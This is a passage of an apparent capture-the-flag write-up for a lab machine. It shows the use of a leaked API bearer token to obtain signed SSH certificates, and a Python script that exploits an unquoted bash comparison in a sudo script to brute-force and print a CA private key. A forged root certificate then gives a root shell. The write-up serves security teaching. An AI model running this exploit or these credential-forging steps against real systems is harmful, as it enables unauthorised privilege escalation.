+curl <span class="nt">-s</span> signserv.ssg.htb/v1/sign <span class="nt">-d</span> <span class="s1">'{"pubkey": "'</span><span class="s2">"</span><span class="nv">$public_key</span><span class="s2">"</span><span class="s1">'", "username": "'</span><span class="s2">"</span><span class="nv">$username</span><span class="s2">"</span><span class="s1">'", "principals": "'</span><span class="s2">"</span><span class="nv">$principal</span><span class="s2">"</span><span class="s1">'"}'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-H</span> <span class="s2">"Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"</span>
+</code></pre></div></div>
+<p>Most of this is input validation. It takes a public key file (that must exist), a username, and a principal. The principal must be one of four options. <code class="language-plaintext highlighter-rouge">support</code> is interesting because it references the IT server. It says the user with that principle is the support user.</p>
+<p>Then it makes a <code class="language-plaintext highlighter-rouge">curl</code> request to <code class="language-plaintext highlighter-rouge">signserv.ssg.htb</code> including an auth token.</p>
+<h3 id="signserv">Signserv</h3>
+<p>I can hit this API from my box after updating my <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl signserv.ssg.htb
+<span class="go">{"detail":"Not Found"}
+</span></code></pre></div></div>
+<p>It needs that endpoint, and to be a POST request with the right auth token and arguments:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl signserv.ssg.htb/v1/sign
+<span class="go">{"detail":"Method Not Allowed"}
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl signserv.ssg.htb/v1/sign <span class="nt">-X</span> POST
+<span class="go">{"detail":"Invalid authorization"}
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl signserv.ssg.htb/v1/sign <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Authorization: Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"</span>
+<span class="go">{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null,"url":"https://errors.pydantic.dev/2.6/v/missing"}]}
+</span></code></pre></div></div>
+<p>I know the arguments needed from the script - <code class="language-plaintext highlighter-rouge">public_key</code>, <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">principals</code>.</p>
+<p>I’ll generate a key for use here:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh-keygen <span class="nt">-t</span> ed25519 <span class="nt">-f</span> resource_key
+<span class="go">Generating public/private ed25519 key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in resource_key
+Your public key has been saved in resource_key.pub
+The key fingerprint is:
+SHA256:GFFYJPtY4UPX6Igc8skRrqznwobvK6UKoxB1VFH3zSE oxdf@hacky
+The key's randomart image is:
++--[ED25519 256]--+
+|    ..*OB ooE .  |
+|   ...+* +...+ . |
+|  . .=+=+o  . o  |
+| . o .**...      |
+|.   o o S        |
+| ...             |
+|+=. .            |
+|B.+o             |
+|+=+o.            |
++----[SHA256]-----+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>resource_key.pub 
+<span class="go">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgp oxdf@hacky
+</span></code></pre></div></div>
+<p>Once I get the right args, with the newly generated public key, I can get a key signed as support:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl signserv.ssg.htb/v1/sign <span class="nt">-d</span> <span class="s1">'{"pubkey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgp oxdf@hacky", "username": "0xdf", "principals": "support"}'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-H</span> <span class="s2">"Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"</span> <span class="nt">-s</span> | <span class="nb">tee </span>resource_key-cert.pub
+<span class="go">ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAIHLp8YsauBHxwtGDTqMskfaTqsbbxcc20ul4crCJeH5aAAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgpAAAAAAAAACgAAAABAAAABDB4ZGYAAAALAAAAB3N1cHBvcnQAAAAAZzVWff//////////AAAAAAAAAIIAAAAVcGVybWl0LVgxMS1mb3J3YXJkaW5nAAAAAAAAABdwZXJtaXQtYWdlbnQtZm9yd2FyZGluZwAAAAAAAAAWcGVybWl0LXBvcnQtZm9yd2FyZGluZwAAAAAAAAAKcGVybWl0LXB0eQAAAAAAAAAOcGVybWl0LXVzZXItcmMAAAAAAAAAAAAAADMAAAALc3NoLWVkMjU1MTkAAAAggeDwK53LVKHJh+rMLcA2WABxbtDgyhm57MATyY0VKbEAAABTAAAAC3NzaC1lZDI1NTE5AAAAQBtLcBNJLkdM1IQNrJUVMhBrBcfgxFEtPjvj9rH3HugT8lYYxaH4LLETc9CWFmFpfc3XnSW7Ao3XVlILeVLYmQM= oxdf@hacky
+</span></code></pre></div></div>
+<p>That key works on the support user on the host server on TCP 2222:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ./resource_key support@ssg.htb <span class="nt">-p</span> 2222
+<span class="go">...[snip]...
+</span><span class="gp">support@ssg:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-zzinter">Shell as zzinter</h2>
+<h3 id="enumeration-3">Enumeration</h3>
+<h4 id="users-1">Users</h4>
+<p>The support home directory is very empty:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">support@ssg:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span>
+<span class="go">total 28
+drwxr-x--- 4 support support 4096 Jun 21 18:11 .
+drwxr-xr-x 4 root    root    4096 Jul 23 13:44 ..
+lrwxrwxrwx 1 root    root       9 Jun 21 18:11 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 support support  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 support support 3771 Jan  6  2022 .bashrc
+drwx------ 2 support support 4096 Feb  7  2024 .cache
+-rw-r--r-- 1 support support  807 Jan  6  2022 .profile
+drwx------ 2 support support 4096 Feb  7  2024 .ssh
+</span></code></pre></div></div>
+<p>zzinter also has an account on this host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">support@ssg:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">support  zzinter
+</span></code></pre></div></div>
+<p>This makes sense, as in the tickets zzinter said he had temp access to this server while the API was under development. The support user can’t access it.</p>
+<h4 id="ssh-key-enumeration">SSH Key Enumeration</h4>
+<p>Looking at the config for SSH on the host, there’s another <code class="language-plaintext highlighter-rouge">sshcerts.conf</code> file in <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config.d</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">support@ssg:/etc/ssh$</span><span class="w"> </span><span class="nb">ls </span>sshd_config.d/
+<span class="go">50-cloud-init.conf  sshcerts.conf
+</span><span class="gp">support@ssg:/etc/ssh$</span><span class="w"> </span><span class="nb">cat </span>sshd_config.d/sshcerts.conf 
+<span class="go">HostKey /etc/ssh/ssh_host_dsa_key
+HostKey /etc/ssh/ssh_host_ecdsa_key
+HostKey /etc/ssh/ssh_host_rsa_key
+HostKey /etc/ssh/ssh_host_ed25519_key
+HostCertificate /etc/ssh/ssh_host_dsa_key-cert.pub
+HostCertificate /etc/ssh/ssh_host_ecdsa_key-cert.pub
+HostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub
+HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub
+TrustedUserCAKeys /etc/ssh/ca-it.pub
+AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u
+PasswordAuthentication no
+</span></code></pre></div></div>
+<p>It blocks password auth, and it defines “Authorized Principals Files” to be in <code class="language-plaintext highlighter-rouge">/etc/ssh/auth_principals</code>. There are three:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">support@ssg:/etc/ssh$</span><span class="w"> </span><span class="nb">ls </span>auth_principals/
+<span class="go">root  support  zzinter
+</span></code></pre></div></div>
+<p>When a user tries to auth over SSH, it looks for a file with that username in this directory, and checks the principal of the certificate to see if it’s in this file. So a certificate signed with the <code class="language-plaintext highlighter-rouge">root_user</code> or <code class="language-plaintext highlighter-rouge">support</code> principal can log in as support:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">support@ssg:/etc/ssh$</span><span class="w"> </span><span class="nb">cat </span>auth_principals/support 
+<span class="go">support
+root_user
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">root_user</code> can log in as root, and <code class="language-plaintext highlighter-rouge">zzinter_temp</code> can log in as zzinter:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">support@ssg:/etc/ssh$</span><span class="w"> </span><span class="nb">cat </span>auth_principals/root 
+<span class="go">root_user
+</span><span class="gp">support@ssg:/etc/ssh$</span><span class="w"> </span><span class="nb">cat </span>auth_principals/zzinter 
+<span class="go">zzinter_temp
+</span></code></pre></div></div>
+<p>It seems the IT staff haven’t removed zzinter’s access yet, despite what he said in the ticket.</p>
+<h3 id="sign-key-1">Sign Key</h3>
+<p>If I try to ask for a key signed by root_user principal, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl signserv.ssg.htb/v1/sign <span class="nt">-d</span> <span class="s1">'{"pubkey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgp oxdf@hacky", "username": "0xdf", "principals": "root_user,support,zzinter_temp"}'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-H</span> <span class="s2">"Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"</span> <span class="nt">-s</span> | <span class="nb">tee </span>resource_key-cert.pub
+<span class="go">{"detail":"Root access must be granted manually. See the IT admin staff."}
+</span></code></pre></div></div>
+<p>I’ll get a new certificate for my key signed with both the support and zzinter_temp principals:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl signserv.ssg.htb/v1/sign <span class="nt">-d</span> <span class="s1">'{"pubkey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgp oxdf@hacky", "username": "0xdf", "principals": "support,zzinter_temp"}'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-H</span> <span class="s2">"Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"</span> <span class="nt">-s</span> | <span class="nb">tee </span>resource_key-cert.pub
+<span class="go">ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAIGZpJ7TO1NuBFyhJKTNEFSfQ66ncsuYsvv8lKZEUtzQkAAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgpAAAAAAAAACwAAAABAAAABDB4ZGYAAAAbAAAAB3N1cHBvcnQAAAAMenppbnRlcl90ZW1wAAAAAGc1WI3//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmxAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEDQXNe7pGsWxNI7rYiUIsDHSo1mbmbqAHcFEEQQrnmY99HYvrcjrGJnrqtLr8VUNagSDSRgBbEAOWLf2YQwpEcH oxdf@hacky
+</span></code></pre></div></div>
+<p>That works to get onto the host as support and zzinter:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-p</span> 2222 <span class="nt">-i</span> ./resource_key support@itrc.ssg.htb 
+<span class="go">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-94-generic x86_64)
+...[snip]...
+</span><span class="gp">support@ssg:~$</span><span class="w"> </span><span class="nb">exit</span>
+<span class="go">logout
+Connection to itrc.ssg.htb closed.
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-p</span> 2222 <span class="nt">-i</span> ./resource_key zzinter@itrc.ssg.htb 
+<span class="go">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
+...[snip]...
+</span><span class="gp">zzinter@ssg:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-4">Enumeration</h3>
+<p>zzinter can run <code class="language-plaintext highlighter-rouge">/opt/sign_key.sh</code> as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zzinter@ssg:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for zzinter on ssg:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User zzinter may run the following commands on ssg:
+    (root) NOPASSWD: /opt/sign_key.sh
+</span></code></pre></div></div>
+<p>This is the script he mentioned in the ticket that he was using, before the API from IT was in place.</p>
+<p>It is very similar to the script he has on ITRC, but rather than using <code class="language-plaintext highlighter-rouge">curl</code> to hit the API, it signs locally:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+usage <span class="o">()</span> <span class="o">{</span>
+    <span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;ca_file&gt; &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt; &lt;serial&gt;"</span>
+    <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 5 <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span>usage
+<span class="k">fi
+
+</span><span class="nv">ca_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+<span class="nv">public_key_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
+<span class="nv">username</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>
+<span class="nv">principal</span><span class="o">=</span><span class="s2">"</span><span class="nv">$4</span><span class="s2">"</span>
+<span class="nv">serial</span><span class="o">=</span><span class="s2">"</span><span class="nv">$5</span><span class="s2">"</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$ca_file</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Error: CA file '</span><span class="nv">$ca_file</span><span class="s2">' not found."</span>
+    usage
+<span class="k">fi
+
+if</span> <span class="o">[[</span> <span class="nv">$ca</span> <span class="o">==</span> <span class="s2">"/etc/ssh/ca-it"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Error: Use API for signing with this CA."</span>
+    usage
+<span class="k">fi
+
+</span><span class="nv">itca</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> /etc/ssh/ca-it<span class="si">)</span>
+<span class="nv">ca</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$ca_file</span><span class="s2">"</span><span class="si">)</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$itca</span> <span class="o">==</span> <span class="nv">$ca</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Error: Use API for signing with this CA."</span>
+    usage
+<span class="k">fi
+
+if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$public_key_file</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Error: Public key file '</span><span class="nv">$public_key_file</span><span class="s2">' not found."</span>
+    usage
+<span class="k">fi
+
+</span><span class="nv">supported_principals</span><span class="o">=</span><span class="s2">"webserver,analytics,support,security"</span>
+<span class="nv">IFS</span><span class="o">=</span><span class="s1">','</span> <span class="nb">read</span> <span class="nt">-ra</span> principal <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$principal_str</span><span class="s2">"</span>
+<span class="k">for </span>word <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">principal</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
+    if</span> <span class="o">!</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$supported_principals</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-qw</span> <span class="s2">"</span><span class="nv">$word</span><span class="s2">"</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Error: '</span><span class="nv">$word</span><span class="s2">' is not a supported principal."</span>
+        <span class="nb">echo</span> <span class="s2">"Choose from:"</span>
+        <span class="nb">echo</span> <span class="s2">"    webserver - external web servers"</span>
+        <span class="nb">echo</span> <span class="s2">"    analytics - analytics team databases"</span>
+        <span class="nb">echo</span> <span class="s2">"    support - IT support server"</span>
+        <span class="nb">echo</span> <span class="s2">"    security - SOC and ITRC servers"</span>
+        <span class="nb">echo
+        </span>usage
+    <span class="k">fi
+done
+
+if</span> <span class="o">!</span> <span class="o">[[</span> <span class="nv">$serial</span> <span class="o">=</span>~ <span class="s2">"^[0-9]+$"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Error: '</span><span class="nv">$serial</span><span class="s2">' is not a number."</span>
+    usage
+<span class="k">fi
+
+</span>ssh-keygen <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$ca_file</span><span class="s2">"</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$serial</span><span class="s2">"</span> <span class="nt">-I</span> <span class="s2">"</span><span class="nv">$username</span><span class="s2">"</span> <span class="nt">-V</span> <span class="nt">-1w</span>:forever <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$principals</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$public_key_name</span><span class="s2">"</span>
+</code></pre></div></div>
+<p>It does have a check to make sure that the script isn’t used with the <code class="language-plaintext highlighter-rouge">ca-it</code> CA, as people should be using the API for this.</p>
+<h3 id="quoteless-bash-compare">Quoteless Bash Compare</h3>
+<h4 id="background">Background</h4>
+<p>The check for the <code class="language-plaintext highlighter-rouge">ca-it</code> file reads the file, and then does a comparison with the given CA file, but it’s done without quotes! This is a vulnerability in Bash, as if there are wildcards in the second item, they will allow. <a href="https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D">This post</a> goes into more detail, and I showed exploiting this as a check bypass in <a href="/2024/04/06/htb-codify.html#shell-as-root">Codify</a> and to read the variable in <a href="/hackvent2023/medium#hv2308">Hackvent 2023 Day 8</a>.</p>
+<h4 id="exploit">Exploit</h4>
+<p>This allows me to brute force the full <code class="language-plaintext highlighter-rouge">ca-it</code> file with a short python script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">string</span>
+
+
+<span class="n">leaked_key</span> <span class="o">=</span> <span class="sh">""</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="sh">"</span><span class="s">-</span><span class="sh">"</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/+</span><span class="se">\n</span><span class="s"> =</span><span class="sh">"</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/dev/shm/file</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">leaked_key</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="sh">"</span><span class="s">*</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">sudo</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/opt/sign_key.sh</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/dev/shm/file</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/etc/passwd</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">0xdf</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">0xdf</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sh">"</span><span class="s">Error: Use API for signing with this CA.</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">result</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">decode</span><span class="p">():</span>
+            <span class="n">leaked_key</span> <span class="o">+=</span> <span class="n">c</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">""</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">break</span>
+
+<span class="nf">print</span><span class="p">()</span>
+</code></pre></div></div>
+<p>It will loop forever until it breaks, and in that loop, it’ll loop over characters. For each one, it will write the leaked key so far plus the potential character plus a wildcard to a file. Then it calls <code class="language-plaintext highlighter-rouge">sign_key.sh</code> on that file, which will do the compare. If the contents up to the “*” are right, it will hit the error for trying to use the forbidden CA cert. I’ll add that character to the <code class="language-plaintext highlighter-rouge">leaked_key</code> and start the character loop again. Once it tries all characters and doesn’t find anything, it will break and exit.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zzinter@ssg:/dev/shm$</span><span class="w"> </span><span class="nb">time </span>python leak_key.py 
+<span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
+rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
+AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
+cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
+QBAgM=
+-----END OPENSSH PRIVATE KEY-----
+
+real    9m7.549s
+user    1m1.340s
+sys     1m51.382s
+</span></code></pre></div></div>
+<h3 id="shell-1">Shell</h3>
+<p>I’ll save that key to a file, and use the same command as used previously to sign a key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh-keygen <span class="nt">-s</span> ca_it <span class="nt">-z</span> 223 <span class="nt">-I</span> <span class="s1">'0xdf'</span> <span class="nt">-V</span> <span class="nt">-5m</span>:forever <span class="nt">-n</span> root_user ~/keys/ed25519_gen.pub
+<span class="go">Signed user key /home/oxdf/keys/ed25519_gen-cert.pub: id "0xdf" serial 223 for root_user valid after 2024-11-17T07:00:44
+</span></code></pre></div></div>
+<p>This time I’m giving the key the principal <code class="language-plaintext highlighter-rouge">root_user</code>, which will allow me to log in as root on the main it host.</p>
+<p>I’ll connect over SSH:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@ssg.htb <span class="nt">-p</span> 2222
+<span class="go">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
+...[snip]...
+root@ssg:~# 
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@ssg:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">e3f5af2f************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2024/11/23/htb-resource.html"></a>
+</article>
